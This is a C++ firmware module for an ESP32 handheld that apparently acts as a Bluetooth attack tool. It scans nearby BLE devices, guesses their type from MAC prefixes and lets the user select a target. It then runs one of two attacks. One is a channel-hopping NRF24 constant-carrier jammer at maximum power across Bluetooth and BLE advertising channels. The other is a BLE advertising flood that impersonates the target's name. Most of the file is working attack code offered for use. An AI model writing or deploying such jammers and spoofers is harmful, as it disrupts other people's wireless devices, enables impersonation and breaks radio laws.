// Menu_BT.cpp — Bluetooth: Scan → Selecionar → Atacar
//
// Fluxo:
//  MODO_BLUETOOTH   → Tela de scan BLE (lista de dispositivos)
//  TELA_BT_SUBMENU  → Dois blocos: [JAMMER NRF24] [SPAM BLE]
//                     (mostra o dispositivo alvo selecionado)
//  TELA_BT_ATTACK   → Ataque ativo contra o alvo

#include "Menu_BT.h"
#include "Battery.h"
#include "Config.h"
#include "Globals.h"
#include "HWProbe.h"
#include "Menu_Main.h"
#include "UI.h"
#include <BLEAdvertisedDevice.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <RF24.h>
#include <SPI.h>

// ── Pinos NRF24 (HSPI: SCK=33 MISO=19 MOSI=13) ──
#define NRF_CE_PIN 22
#define NRF_CSN_PIN 4

// ── Layout ────────────────────────────────────────
#define SCR_W 128
#define SCR_H 160

// ── Canais ────────────────────────────────────────
// BLE advertising channels → offsets de 2400 MHz
static const uint8_t BLE_ADV_CH[3] = {2, 26, 80};
// Bluetooth Classic: 21 canais principais
static const uint8_t BT_CLASSIC_CH[21] = {32, 34, 46, 48, 50, 52, 0,
                                          1,  2,  4,  6,  8,  22, 24,
                                          26, 28, 30, 74, 76, 78, 80};
static const char JAM_PAYLOAD[17] = "xxxxxxxxxxxxxxxx";

// ── Tipos de dispositivo BLE ─────────────────────
enum BtDevType {
  BT_TYPE_UNKNOWN = 0,
  BT_TYPE_PHONE,
  BT_TYPE_COMPUTER,
  BT_TYPE_SPEAKER,
  BT_TYPE_HEADPHONES,
  BT_TYPE_WATCH,
  BT_TYPE_TV,
  BT_TYPE_TABLET,
  BT_TYPE_KEYBOARD,
  BT_TYPE_MOUSE,
  BT_TYPE_BEACON,
  BT_TYPE_CAMERA,
  BT_TYPE_GAMING,
};

// ── OUI → Tipo de dispositivo ─────────────────────
// Prefixo de 8 chars ("XX:XX:XX"), tipo correspondente
struct OuiEntry {
  const char *oui;
  BtDevType type;
};
static const OuiEntry OUI_TABLE[] = {
    // ── Apple (iPhone, Mac, iPad, AirPods, Watch) ─
    {"00:03:93", BT_TYPE_COMPUTER},
    {"00:0a:27", BT_TYPE_COMPUTER},
    {"00:0d:93", BT_TYPE_COMPUTER},
    {"00:11:24", BT_TYPE_COMPUTER},
    {"00:14:51", BT_TYPE_COMPUTER},
    {"00:16:cb", BT_TYPE_COMPUTER},
    {"00:17:f2", BT_TYPE_COMPUTER},
    {"00:19:e3", BT_TYPE_COMPUTER},
    {"00:1c:b3", BT_TYPE_COMPUTER},
    {"00:1d:4f", BT_TYPE_COMPUTER},
    {"00:1e:52", BT_TYPE_COMPUTER},
    {"00:1f:5b", BT_TYPE_COMPUTER},
    {"00:21:e9", BT_TYPE_COMPUTER},
    {"00:22:41", BT_TYPE_COMPUTER},
    {"00:23:12", BT_TYPE_COMPUTER},
    {"00:23:6c", BT_TYPE_COMPUTER},
    {"00:24:36", BT_TYPE_COMPUTER},
    {"00:25:00", BT_TYPE_PHONE},
    {"00:26:08", BT_TYPE_PHONE},
    {"28:37:37", BT_TYPE_PHONE},
    {"3c:d0:f8", BT_TYPE_PHONE},
    {"40:30:04", BT_TYPE_PHONE},
    {"a4:c3:61", BT_TYPE_PHONE},
    {"b8:78:2e", BT_TYPE_PHONE},
    {"dc:a4:ca", BT_TYPE_PHONE},
    {"f0:d1:a9", BT_TYPE_PHONE},
    // ── Samsung (Galaxy, Buds, Watch) ─────────────
    {"00:07:ab", BT_TYPE_PHONE},
    {"00:12:47", BT_TYPE_PHONE},
    {"00:15:b9", BT_TYPE_PHONE},
    {"00:16:32", BT_TYPE_PHONE},
    {"00:17:c9", BT_TYPE_PHONE},
    {"00:1a:8a", BT_TYPE_PHONE},
    {"00:1b:98", BT_TYPE_PHONE},
    {"00:1c:43", BT_TYPE_PHONE},
    {"00:1e:e2", BT_TYPE_PHONE},
    {"78:52:1a", BT_TYPE_PHONE},
    {"a0:b4:a5", BT_TYPE_PHONE},
    {"c4:57:6e", BT_TYPE_PHONE},
    // ── Sony (fones, caixas, TV) ──────────────────
    {"00:01:4a", BT_TYPE_HEADPHONES},
    {"00:13:a9", BT_TYPE_SPEAKER},
    {"00:1d:ba", BT_TYPE_TV},
    {"00:24:be", BT_TYPE_HEADPHONES},
    {"04:cb:88", BT_TYPE_HEADPHONES},
    {"ac:9b:0a", BT_TYPE_HEADPHONES},
    // ── JBL / Harman ──────────────────────────────
    {"00:23:7f", BT_TYPE_SPEAKER},
    {"04:fe:f3", BT_TYPE_SPEAKER},
    {"94:b2:cc", BT_TYPE_SPEAKER},
    // ── Bose ──────────────────────────────────────
    {"00:09:a7", BT_TYPE_HEADPHONES},
    {"04:52:c7", BT_TYPE_HEADPHONES},
    {"88:c6:26", BT_TYPE_HEADPHONES},
    // ── Xiaomi ────────────────────────────────────
    {"00:9e:c8", BT_TYPE_PHONE},
    {"28:6c:07", BT_TYPE_PHONE},
    {"34:80:b3", BT_TYPE_PHONE},
    {"f4:8b:32", BT_TYPE_PHONE},
    // ── Google ────────────────────────────────────
    {"00:1a:11", BT_TYPE_COMPUTER},
    {"54:60:09", BT_TYPE_PHONE},
    // ── Microsoft ─────────────────────────────────
    {"00:1d:d8", BT_TYPE_COMPUTER},
    {"28:18:78", BT_TYPE_COMPUTER},
    {"7c:1e:52", BT_TYPE_KEYBOARD},
    // ── Beats ─────────────────────────────────────
    {"ac:bc:32", BT_TYPE_HEADPHONES},
    {"28:6a:b8", BT_TYPE_HEADPHONES},
    // ── Logitech (mouse/teclado) ──────────────────
    {"00:1f:20", BT_TYPE_MOUSE},
    {"00:1d:7e", BT_TYPE_KEYBOARD},
    // ── Garmin / Fitbit (watch) ───────────────────
    {"00:1d:23", BT_TYPE_WATCH},
    {"00:23:36", BT_TYPE_WATCH},
    // ── Estimote / iBeacon ────────────────────────
    {"d0:cf:5e", BT_TYPE_BEACON},
    {"e2:c5:6d", BT_TYPE_BEACON},
    // ── Canon / Nikon (camera BT) ─────────────────
    {"00:0d:2d", BT_TYPE_CAMERA},
    {"00:21:5d", BT_TYPE_CAMERA},
    // ── Nintendo / Sony Gaming ────────────────────
    {"00:0d:67", BT_TYPE_GAMING},
    {"00:19:1d", BT_TYPE_GAMING},
    // sentinel
    {nullptr, BT_TYPE_UNKNOWN}};

// Retorna o tipo de dispositivo a partir do MAC ("xx:xx:xx:...")
static BtDevType ouiLookup(const char *mac) {
  // Normaliza para minúsculo e compara os primeiros 8 chars ("xx:xx:xx")
  char prefix[9];
  for (int i = 0; i < 8 && mac[i]; i++)
    prefix[i] = tolower((unsigned char)mac[i]);
  prefix[8] = '\0';
  for (int i = 0; OUI_TABLE[i].oui != nullptr; i++)
    if (strncmp(OUI_TABLE[i].oui, prefix, 8) == 0)
      return OUI_TABLE[i].type;
  return BT_TYPE_UNKNOWN;
}

// Categoria completa por extenso para exibir na tela
static const char *devTypeLabel(BtDevType t) {
  switch (t) {
  case BT_TYPE_PHONE:
    return "Celular";
  case BT_TYPE_COMPUTER:
    return "Computador";
  case BT_TYPE_SPEAKER:
    return "Caixa de Som";
  case BT_TYPE_HEADPHONES:
    return "Fone de Ouvido";
  case BT_TYPE_WATCH:
    return "Smartwatch";
  case BT_TYPE_TV:
    return "Televisao";
  case BT_TYPE_TABLET:
    return "Tablet";
  case BT_TYPE_KEYBOARD:
    return "Teclado";
  case BT_TYPE_MOUSE:
    return "Mouse";
  case BT_TYPE_BEACON:
    return "Beacon";
  case BT_TYPE_CAMERA:
    return "Camera";
  case BT_TYPE_GAMING:
    return "Controle";
  default:
    return "Desconhecido";
  }
}

// ── Dispositivos escaneados ───────────────────────
#define MAX_BT_DEVS 8
struct BtDev {
  char name[20];
  char mac[18];
  int8_t rssi;
  BtDevType devType;
};
static BtDev btDevs[MAX_BT_DEVS];
static int btDevCount = 0;
static int btDevCursor = 0;  // índice selecionado na lista
static int btDevTarget = -1; // índice do dispositivo alvo
static bool bleReady = false;
static bool btScanning = false;

// ── NRF24 ─────────────────────────────────────────
static SPIClass spiJam(HSPI);
static RF24 radio(NRF_CE_PIN, NRF_CSN_PIN);
static bool nrfReady = false;

// ── Ataque ────────────────────────────────────────
enum BtAttackKind { BT_NONE, BT_JAMMER, BT_SPAM };
static BtAttackKind currentAttack = BT_NONE;
static bool attackActive = false;
static unsigned long jamCount = 0;
static unsigned long spamCount = 0;
static unsigned long jamLastMs = 0;
static uint8_t jamChIndex = 0;

// ─────────────────────────────────────────────────
//  Helpers de tela
// ─────────────────────────────────────────────────
static void btHeader(const char *t) {
  tft.fillScreen(C_BG);
  drawHeader(t, true);
}

static void btFooter() {
  drawFooter();
}


// ─────────────────────────────────────────────────
//  BLE init / scan
// ─────────────────────────────────────────────────
static void bleEnsureInit() {
  if (bleReady)
    return;
  Serial.println("[BT] Inicializando BLE...");
  BLEDevice::init("r4bb1t");
  delay(150); // aguarda tensão estabilizar após ativar rádio BT
  bleReady = true;
  Serial.println("[BT] BLE pronto.");
}

class BtScanCb : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) override {
    if (btDevCount >= MAX_BT_DEVS)
      return;

    // Evita duplicatas por MAC
    char mac[18];
    strncpy(mac, dev.getAddress().toString().c_str(), 17);
    mac[17] = '\0';
    for (int i = 0; i < btDevCount; i++) {
      if (strcmp(btDevs[i].mac, mac) == 0) {
        // Atualiza RSSI e tenta pegar nome se ainda não tem
        btDevs[i].rssi = dev.getRSSI();
        if (btDevs[i].name[0] == '\0' || strcmp(btDevs[i].name, "?") == 0) {
          String n = "";
          if (dev.haveName())
            n = dev.getName().c_str();
          if (n.length() == 0 && dev.haveAppearance()) { /* aparência, ignora */
          }
          if (n.length() > 0) {
            strncpy(btDevs[i].name, n.c_str(), 19);
            btDevs[i].name[19] = '\0';
          }
        }
        return;
      }
    }

    strncpy(btDevs[btDevCount].mac, mac, 17);
    btDevs[btDevCount].mac[17] = '\0';

    // Tenta obter nome de múltiplas fontes
    String nameStr = "";
    if (dev.haveName())
      nameStr = dev.getName().c_str();
    // Fallback: se nome vazio, usa "?" — não "(sem nome)" para ocupar menos
    // espaço
    const char *raw = (nameStr.length() > 0) ? nameStr.c_str() : "?";
    strncpy(btDevs[btDevCount].name, raw, 19);
    btDevs[btDevCount].name[19] = '\0';

    btDevs[btDevCount].rssi = dev.getRSSI();
    btDevs[btDevCount].devType = ouiLookup(mac);
    btDevCount++;
  }
};
static BtScanCb scanCb;

// ─────────────────────────────────────────────────
//  NRF24 init (mesma sequência confiável do Menu_NRF24)
// ─────────────────────────────────────────────────
static bool nrfJamInit() {
  if (nrfReady)
    return true;

  Serial.println("[BT-JAM] Iniciando NRF24L01...");
  pinMode(NRF_CSN_PIN, OUTPUT);
  digitalWrite(NRF_CSN_PIN, HIGH);
  pinMode(NRF_CE_PIN, OUTPUT);
  digitalWrite(NRF_CE_PIN, LOW);
  delay(50); // BLE ativo aumenta consumo — aguarda tensão estabilizar

  // Frequência baixa (1 MHz) — BLE usa interrupções que podem corromper SPI
  spiJam.begin(33, 19, 13, -1);
  spiJam.setFrequency(1000000);
  delay(20);

  // 5 tentativas com backoff crescente
  bool ok = false;
  for (int t = 1; t <= 5 && !ok; t++) {
    ok = radio.begin(&spiJam);
    Serial.printf("[BT-JAM] radio.begin() tentativa %d = %s\n", t,
                  ok ? "OK" : "FALHOU");
    if (!ok)
      delay(100 * t); // 100ms, 200ms, 300ms...
  }

  if (!ok) {
    Serial.printf("[BT-JAM] isChipConnected=%s\n",
                  radio.isChipConnected() ? "SIM (SPI ok, reg invalido)"
                                          : "NAO (SPI falhou)");
    return false;
  }
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPayloadSize(5);
  radio.setAddressWidth(3);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.disableCRC();
  radio.disableAckPayload();
  radio.disableDynamicPayloads();

  nrfReady = true;
  Serial.println("[BT-JAM] NRF24 pronto.");
  return true;
}

static void nrfJamDeinit() {
  if (!nrfReady)
    return;
  radio.stopConstCarrier();
  radio.powerDown();
  nrfReady = false;
}

// ═════════════════════════════════════════════════
//  MODO_BLUETOOTH — Lista de dispositivos
//
//  Layout do cursor (btMenuCursor):
//    0 → Voltar
//    1 → Reescanear
//    2..N → dispositivos btDevs[cursor-2]
// ═════════════════════════════════════════════════
static int btMenuCursor = 0; // cursor unificado

// Número de itens navegáveis no menu BT
static inline int btMenuItems() { return 2 + btDevCount; }

void displayMenuBT() {
  tft.fillScreen(C_BG);
  tft.setTextSize(1);

  // Header Cyber Edition
  drawHeader("BLE SCAN", false);

  if (btScanning) {
    tft.setTextColor(C_GREEN);
    tft.setCursor(14, 74);
    tft.print("Escaneando (8s)...");
    batteryDraw();
    return;
  }

  // Item 0: Voltar
  drawMenuItem(0, 16, SCR_W, 18, "< VOLTAR", btMenuCursor == 0, false);

  // Item 1: Reescanear
  char rescanLabel[24];
  if (btDevCount > 0)
    snprintf(rescanLabel, sizeof(rescanLabel), "Reescanear (%d)", btDevCount);
  else
    snprintf(rescanLabel, sizeof(rescanLabel), "Reescanear");
  drawMenuItem(0, 35, SCR_W, 18, rescanLabel, btMenuCursor == 1);

  tft.drawFastHLine(0, 54, SCR_W, C_GREY);

  // Lista de dispositivos
  if (btDevCount == 0) {
    tft.setTextColor(C_GREY);
    tft.setCursor(6, 68);
    tft.print("Nenhum encontrado.");
    tft.setCursor(6, 82);
    tft.print("Selecione Reescanear.");
    batteryDraw();
    return;
  }

  const int ITEM_H = 24;
  const int Y0 = 56;
  int maxVisible = (SCR_H - Y0 - 18) / ITEM_H;

  int devIdx = btMenuCursor - 2;
  static int devScroll = 0;
  if (devIdx >= 0) {
      devScroll = devIdx;
    if (devIdx >= devScroll + maxVisible)
      devScroll = devIdx - maxVisible + 1;
  }

  for (int i = 0; i < maxVisible; i++) {
    int idx = devScroll + i;
    if (idx >= btDevCount)
      break;

    int y = Y0 + i * ITEM_H;
    bool sel = (btMenuCursor == idx + 2);

    if (sel) {
      tft.fillRect(0, y, SCR_W, ITEM_H - 1, 0x2104);
      tft.drawRect(0, y, SCR_W, ITEM_H - 1, TFT_CYAN);
    }

    // ── Nome em branco forte (ou últimos bytes do MAC se sem nome) ─
    bool hasName =
        (btDevs[idx].name[0] != '\0' && strcmp(btDevs[idx].name, "?") != 0);
    tft.setTextColor(sel ? TFT_WHITE : 0xC618); // branco / cinza claro
    tft.setCursor(6, y + 3);
    if (hasName) {
      tft.print(btDevs[idx].name); // nome completo, sem truncar
    } else {
      // Sem nome: mostra o MAC completo como identificador
      tft.print(btDevs[idx].mac);
    }

    // ── RSSI no canto direito ──────────────────
    tft.setTextColor(sel ? TFT_YELLOW : 0x39E7);
    char rssiStr[6];
    snprintf(rssiStr, sizeof(rssiStr), "%d", btDevs[idx].rssi);
    tft.setCursor(SCR_W - (int)strlen(rssiStr) * 6 - 2, y + 3);
    tft.print(rssiStr);

    // ── Categoria por extenso embaixo ─────────
    tft.setTextColor(sel ? TFT_CYAN : TFT_DARKGREY);
    tft.setCursor(6, y + 13);
    tft.print(devTypeLabel(btDevs[idx].devType));
  }

  // Indicador de scroll
  if (devScroll > 0) {
    tft.setTextColor(TFT_DARKGREY);
    tft.setCursor(SCR_W - 8, Y0);
    tft.print("^");
  }
  if (devScroll + maxVisible < btDevCount) {
    tft.setTextColor(TFT_DARKGREY);
    tft.setCursor(SCR_W - 8, Y0 + (maxVisible - 1) * ITEM_H + 3);
    tft.print("v");
  }

  // ── Rodapé ────────────────────────────────────
  tft.drawFastHLine(0, SCR_H - 16, SCR_W, TFT_DARKGREY);
  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(5, SCR_H - 10);
  tft.print("^");
  tft.setCursor(SCR_W / 2 - 2, SCR_H - 10);
  tft.print("o");
  tft.setCursor(SCR_W - 11, SCR_H - 10);
  tft.print("v");

  batteryDraw();
}

static void doScan() {
  bleEnsureInit();
  if (!bleReady)
    return;

  btDevCount = 0;
  btScanning = true;
  displayMenuBT();

  BLEScan *pScan = BLEDevice::getScan();
  pScan->clearResults();
  pScan->setAdvertisedDeviceCallbacks(&scanCb, false);
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);
  pScan->start(8, false);

  btScanning = false;
  displayMenuBT();
}

void handleMenuBT() {
  if ((millis() - lastDebounceTime) <= debounceDelay)
    return;

  int total = btMenuItems();

  // UP / LEFT → sobe cursor
  if (digitalRead(BUTTON_LEFT) == LOW) {
    lastDebounceTime = millis();
    btMenuCursor = (btMenuCursor - 1 + total) % total;
    displayMenuBT();
    return;
  }

  // DOWN / RIGHT → desce cursor
  if (digitalRead(BUTTON_RIGHT) == LOW) {
    lastDebounceTime = millis();
    btMenuCursor = (btMenuCursor + 1) % total;
    displayMenuBT();
    return;
  }

  // SELECT → executa ação do item em foco
  if (digitalRead(BUTTON_SELECT) == LOW) {
    lastDebounceTime = millis();

    if (btMenuCursor == 0) {
      // Voltar
      estadoAtual = MENU_INICIAL;
      displayMenuInicial();
      return;
    }

    if (btMenuCursor == 1) {
      // Reescanear
      doScan();
      return;
    }

    // Dispositivo selecionado
    btDevTarget = btMenuCursor - 2;
    currentAttack = BT_NONE;
    attackActive = false;
    jamCount = spamCount = 0;
    estadoAtual = TELA_BT_SUBMENU;
    displayBT_SubMenu();
  }
}

// ═════════════════════════════════════════════════
//  TELA_BT_SUBMENU — escolha de ataque para o alvo
// ═════════════════════════════════════════════════
struct BtCell {
  int x, y, w, h;
};
static const BtCell btCells[2] = {
    {8, 50, 52, 60},  // 0 – Jammer
    {68, 50, 52, 60}, // 1 – Spam
};

static void drawJammerIcon(int cx, int cy, uint16_t col) {
  tft.drawLine(cx - 12, cy - 2, cx + 12, cy - 2, col);
  tft.drawLine(cx - 12, cy + 2, cx + 12, cy + 2, col);
  tft.drawLine(cx - 12, cy - 8, cx - 12, cy + 8, col);
  tft.drawLine(cx + 12, cy - 8, cx + 12, cy + 8, col);
  for (int i = -8; i <= 8; i += 4) {
    tft.drawPixel(cx + i, cy - 4, col);
    tft.drawPixel(cx + i, cy + 4, col);
  }
  tft.fillCircle(cx, cy, 2, col);
}

static void drawSpamIcon(int cx, int cy, uint16_t col) {
  tft.drawRect(cx - 11, cy - 5, 22, 14, col);
  tft.drawLine(cx - 11, cy - 5, cx, cy + 3, col);
  tft.drawLine(cx + 11, cy - 5, cx, cy + 3, col);
  tft.drawLine(cx - 5, cy - 10, cx - 5, cy - 7, col);
  tft.drawLine(cx, cy - 12, cx, cy - 9, col);
  tft.drawLine(cx + 5, cy - 10, cx + 5, cy - 7, col);
}

static int btSubSel = 0; // 0=Jammer, 1=Spam

void displayBT_SubMenu() {
  tft.fillScreen(C_BG);
  drawHeader("ATAQUE BT", true);

  tft.setTextSize(1);
  tft.setTextColor(C_GOLD_DIM);
  tft.setCursor(4, 18);
  tft.print("Alvo: ");
  tft.setTextColor(C_WHITE);
  if (btDevTarget >= 0) {
    char buf[18];
    strncpy(buf, btDevs[btDevTarget].name, 17);
    buf[17] = '\0';
    tft.print(buf);
  }

  static const char *names[2] = {"JAMMER", "SPAM"};
  static const uint16_t acols[2] = {C_RED, C_GOLD};

  for (int i = 0; i < 2; i++) {
    const BtCell &c = btCells[i];
    bool sel = (i == btSubSel);
    uint16_t col = acols[i];

    tft.fillRect(c.x, c.y, c.w, c.h, sel ? C_GOLD_SEL : C_BG);
    tft.drawRect(c.x, c.y, c.w, c.h, sel ? col : C_GREY);
    if (sel) tft.drawRect(c.x + 1, c.y + 1, c.w - 2, c.h - 2, C_GOLD_SEL);

    int icx = c.x + c.w / 2;
    int icy = c.y + c.h / 2 - 6;
    if (i == 0) drawJammerIcon(icx, icy, col);
    else        drawSpamIcon(icx, icy, col);

    tft.setTextColor(sel ? col : C_GREY);
    int lx = c.x + (c.w - (int)strlen(names[i]) * 6) / 2;
    tft.setCursor(lx, c.y + c.h - 12);
    tft.print(names[i]);
  }

  drawFooter();
  batteryDraw();
}

void handleBT_SubMenu() {
  if ((millis() - lastDebounceTime) > debounceDelay) {

    if (digitalRead(BUTTON_RIGHT) == LOW) {
      btSubSel = (btSubSel + 1) % 2;
      lastDebounceTime = millis();
      displayBT_SubMenu();
    }

    if (digitalRead(BUTTON_LEFT) == LOW) {
      lastDebounceTime = millis();
      // Volta para a lista de scan
      estadoAtual = MODO_BLUETOOTH;
      displayMenuBT();
      return;
    }

    if (digitalRead(BUTTON_SELECT) == LOW) {
      lastDebounceTime = millis();
      currentAttack = (btSubSel == 0) ? BT_JAMMER : BT_SPAM;
      attackActive = false;
      jamCount = spamCount = 0;
      jamChIndex = 0;

      if (currentAttack == BT_JAMMER)
        nrfJamInit();

      estadoAtual = TELA_BT_ATTACK;
      displayBT_Attack();
    }
  }
}

// ═════════════════════════════════════════════════
//  TELA_BT_ATTACK — ataque contra o alvo
// ═════════════════════════════════════════════════

// Jammer: portadora constante varrendo canais BT
static void jammerStep() {
  if (!nrfReady)
    return;
  jamChIndex = (jamChIndex + 1) % 21;
  radio.setChannel(BT_CLASSIC_CH[jamChIndex]);
  // A cada volta completa cobre também os 3 canais BLE adv
  if (jamChIndex == 0) {
    for (uint8_t i = 0; i < 3; i++)
      radio.setChannel(BLE_ADV_CH[i]);
    radio.setChannel(BT_CLASSIC_CH[0]);
  }
  jamCount++;
}

// Spam: flood de ADV com o nome do alvo (confunde scanners)
static void spamStep() {
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  pAdv->stop();
  BLEAdvertisementData d;
  // Usa o nome do alvo para "impersonar" nas ondas
  const char *targetName =
      (btDevTarget >= 0) ? btDevs[btDevTarget].name : "r4bb1t";
  d.setName(targetName);
  pAdv->setAdvertisementData(d);
  pAdv->start();
  delay(10);
  pAdv->stop();
  spamCount++;
}

void displayBT_Attack() {
  bool isJam = (currentAttack == BT_JAMMER);
  const char *titulo = isJam ? "NRF24 JAMMER" : "BLE SPAM";

  btHeader(titulo);
  tft.setTextSize(1);

  // Alvo
  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(4, 20);
  tft.print("Alvo:");
  tft.setTextColor(TFT_WHITE);
  if (btDevTarget >= 0) {
    char buf[14];
    strncpy(buf, btDevs[btDevTarget].name, 13);
    buf[13] = '\0';
    tft.setCursor(38, 20);
    tft.print(buf);
    tft.setTextColor(TFT_DARKGREY);
    tft.setCursor(4, 30);
    tft.print(btDevs[btDevTarget].mac);
  }

  // Banner ATIVO/INATIVO
  if (attackActive) {
    tft.fillRect(0, 42, SCR_W, 12, TFT_RED);
    tft.setTextColor(TFT_WHITE);
    tft.setCursor((SCR_W - 5 * 6) / 2, 44);
    tft.print("ATIVO");
  } else {
    tft.fillRect(0, 42, SCR_W, 12, 0x1082);
    tft.setTextColor(TFT_DARKGREY);
    tft.setCursor((SCR_W - 7 * 6) / 2, 44);
    tft.print("INATIVO");
  }

  // NRF24 status
  if (isJam) {
    tft.setTextColor(nrfReady ? TFT_GREEN : TFT_RED);
    tft.setCursor(4, 58);
    tft.print(nrfReady ? "NRF24: OK" : "NRF24: NAO FOUND");
  } else {
    tft.setTextColor(TFT_CYAN);
    tft.setCursor(4, 58);
    tft.print("Impersona alvo via ADV");
  }

  // Contador
  tft.setTextSize(2);
  tft.setTextColor(attackActive ? TFT_WHITE : TFT_DARKGREY);
  tft.fillRect(4, 70, SCR_W - 8, 18, TFT_BLACK);
  tft.setCursor(4, 70);
  tft.print(isJam ? "CH: " : "PKT: ");
  tft.print(isJam ? (unsigned long)BT_CLASSIC_CH[jamChIndex] : spamCount);

  // Instrução
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(4, 100);
  tft.print(attackActive ? "o = PARAR" : "o = INICIAR");
  tft.setCursor(4, 112);
  tft.print("< = Voltar");

  btFooter();
  batteryDraw();
}

void handleBT_Attack() {

  // Loop não-bloqueante
  if (attackActive) {
    if (currentAttack == BT_JAMMER)
      jammerStep();
    else
      spamStep();

    // Atualiza display a cada 300ms
    if (millis() - jamLastMs > 300) {
      jamLastMs = millis();
      tft.setTextSize(2);
      tft.setTextColor(TFT_WHITE);
      tft.fillRect(4, 70, SCR_W - 8, 18, TFT_BLACK);
      tft.setCursor(4, 70);
      if (currentAttack == BT_JAMMER) {
        tft.print("CH: ");
        tft.print((unsigned long)BT_CLASSIC_CH[jamChIndex]);
      } else {
        tft.print("PKT: ");
        tft.print(spamCount);
      }
    }
  }

  if ((millis() - lastDebounceTime) > debounceDelay) {

    // LEFT → para ataque e volta para sub-menu
    if (digitalRead(BUTTON_LEFT) == LOW) {
      lastDebounceTime = millis();
      attackActive = false;
      if (currentAttack == BT_JAMMER)
        nrfJamDeinit();
      else if (bleReady)
        BLEDevice::getAdvertising()->stop();
      jamCount = spamCount = 0;
      currentAttack = BT_NONE;
      estadoAtual = TELA_BT_SUBMENU;
      displayBT_SubMenu();
      return;
    }

    // SELECT → toggle ataque
    if (digitalRead(BUTTON_SELECT) == LOW) {
      lastDebounceTime = millis();
      attackActive = !attackActive;

      if (currentAttack == BT_JAMMER) {
        if (attackActive) {
          radio.startConstCarrier(RF24_PA_MAX, BT_CLASSIC_CH[0]);
          jamChIndex = 0;
          Serial.println("[BT-JAM] Portadora ativada.");
        } else {
          radio.stopConstCarrier();
          Serial.println("[BT-JAM] Portadora parada.");
        }
      } else {
        if (!attackActive && bleReady)
          BLEDevice::getAdvertising()->stop();
      }
      displayBT_Attack();
    }
  }
}

// ═════════════════════════════════════════════════
//  Stubs — TELA_BT_SCAN (não usado, redireciona)
// ═════════════════════════════════════════════════
void displayBT_Scan() { displayMenuBT(); }
void handleBT_Scan() {
  estadoAtual = MODO_BLUETOOTH;
  handleMenuBT();
}
